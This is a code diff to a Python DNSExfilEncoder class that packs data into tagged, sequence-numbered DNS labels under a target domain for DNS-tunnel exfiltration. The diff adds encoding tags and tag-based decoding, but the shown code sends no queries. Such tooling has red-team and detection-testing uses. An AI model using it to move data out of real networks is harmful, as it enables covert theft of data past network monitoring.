@@ -4,7 +4,8 @@
 # Encoding pipeline:
 #   input bytes -> encoded string -> chunked labels -> FQDNs
 #
-# Each FQDN follows the pattern: {seq:02d}_{chunk}.{target_domain}
+# Each FQDN follows: {seq:02d}_{encoding_tag}_{chunk}.{target_domain}
+# encoding_tag: h (hex), b32 (base32), b64 (base64).
 # A termination FQDN signals end of stream: done.{target_domain}
 
 from __future__ import annotations
@@ -18,11 +19,16 @@ logger = logging.getLogger(__name__)
 # DNS label max length per RFC 1035.
 _DNS_LABEL_MAX = 63
 
-# Sequence prefix format: "00_", "01_", ... "99_" — 3 chars overhead.
-_SEQ_PREFIX_LEN = 3
+# Max characters consumed by "{seq}_{tag}_" before the payload chunk (seq up to
+# 4 digits, tag up to 3 chars) so every label stays within RFC 1035's 63 limit.
+_MAX_LABEL_PREFIX_OVERHEAD = 12
 
-# Hard cap on chunk_size to ensure sequence prefix + chunk <= 63.
-_MAX_CHUNK_SIZE = _DNS_LABEL_MAX - _SEQ_PREFIX_LEN  # 60
+# Hard cap on chunk_size to ensure full label (prefix + chunk) <= 63.
+_MAX_CHUNK_SIZE = _DNS_LABEL_MAX - _MAX_LABEL_PREFIX_OVERHEAD
+
+# Wire-format encoding tags embedded in each label (between seq and chunk).
+_ENCODING_TAGS: dict[str, str] = {"hex": "h", "base32": "b32", "base64": "b64"}
+_TAG_TO_ENCODING: dict[str, str] = {"h": "hex", "b32": "base32", "b64": "base64"}
 
 # Encoding schemes accepted by DNSExfilEncoder.
 SUPPORTED_ENCODINGS = ("hex", "base32", "base64")
@@ -55,7 +61,7 @@ class DNSExfilEncoder:
             raise ValueError(
                 f"chunk_size {chunk_size} exceeds maximum {_MAX_CHUNK_SIZE}. "
                 f"DNS labels are capped at {_DNS_LABEL_MAX} chars; "
-                f"sequence prefix consumes {_SEQ_PREFIX_LEN}."
+                f"sequence and encoding tag prefix consume up to {_MAX_LABEL_PREFIX_OVERHEAD}."
             )
         if chunk_size < 1:
             raise ValueError("chunk_size must be at least 1.")
@@ -107,8 +113,9 @@ class DNSExfilEncoder:
             for i in range(0, len(encoded_str), self.chunk_size)
         ]
 
+        tag = _ENCODING_TAGS[self.encoding]
         fqdns = [
-            f"{seq:02d}_{chunk}.{self.target_domain}"
+            f"{seq:02d}_{tag}_{chunk}.{self.target_domain}"
             for seq, chunk in enumerate(chunks)
         ]
         fqdns.append(f"done.{self.target_domain}")
@@ -144,17 +151,27 @@ class DNSExfilEncoder:
             f for f in fqdns if not f.startswith(f"done.{self.target_domain}")
         ]
 
-        parts: list[str] = []
+        parts_list: list[tuple[str, str, str]] = []
         for fqdn in data_fqdns:
-            # Extract label: everything before the first "."
             label = fqdn.split(".")[0]
-            # Strip sequence prefix: "00_abc" -> "abc"
-            if "_" not in label:
+            label_parts = label.split("_", 2)
+            if len(label_parts) < 3:
                 raise ValueError(
-                    f"FQDN label '{label}' missing expected sequence prefix (e.g. '00_')."
+                    f"FQDN label '{label}' missing encoding tag "
+                    f"(expected format: 'NN_tag_chunk')."
                 )
-            chunk = label.split("_", 1)[1]
-            parts.append(chunk)
+            seq_str, encoding_tag, chunk = label_parts
+            if encoding_tag not in _TAG_TO_ENCODING:
+                raise ValueError(
+                    f"Unknown encoding tag '{encoding_tag}' in label '{label}'."
+                )
+            parts_list.append((seq_str, encoding_tag, chunk))
 
-        full_encoded = "".join(parts)
-        return self._decode_string(full_encoded)
+        if not parts_list:
+            return b""
+
+        inferred_encoding = _TAG_TO_ENCODING[parts_list[0][1]]
+        decoder = DNSExfilEncoder(
+            self.target_domain, self.chunk_size, encoding=inferred_encoding
+        )
+        return decoder._decode_string("".join(p[2] for p in parts_list))
